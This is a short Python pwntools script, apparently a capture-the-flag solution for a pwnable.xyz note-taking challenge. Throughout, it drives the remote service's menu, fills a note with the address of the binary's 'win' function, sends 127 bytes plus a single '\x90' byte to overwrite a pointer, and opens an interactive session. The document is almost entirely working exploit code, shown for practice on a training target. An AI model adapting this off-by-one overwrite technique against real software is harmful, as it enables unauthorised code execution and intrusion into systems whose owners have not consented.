from pwn import *
#p = process("./challenge")
p = remote("svc.pwnable.xyz", 30035)
elf = ELF("./challenge")
libc = elf.libc
def make_note(size, title, note):
	p.sendlineafter("> ", "1")
	p.sendlineafter("size: ", str(size))
	sleep(0.1)
	p.sendafter("Title: ", title)
	sleep(0.1)
	p.sendafter("Note: ", note)

def edit_note(note):
	p.sendlineafter("> ", "2")
	p.sendafter("note: ", note)

def delete_note():
	p.sendlineafter("> ", "3")

if __name__ == "__main__":
	p.sendafter("notebook: ", "a" * 128)
	make_note(128, "a" * 31, p64(elf.symbols['win']) * (128 / 8))
	sleep(0.1)
	p.sendlineafter("> ", "4")
	sleep(0.1)
	p.send("a" * 127 + "\x90")
	sleep(0.1)
	p.sendline("2")
	p.interactive()
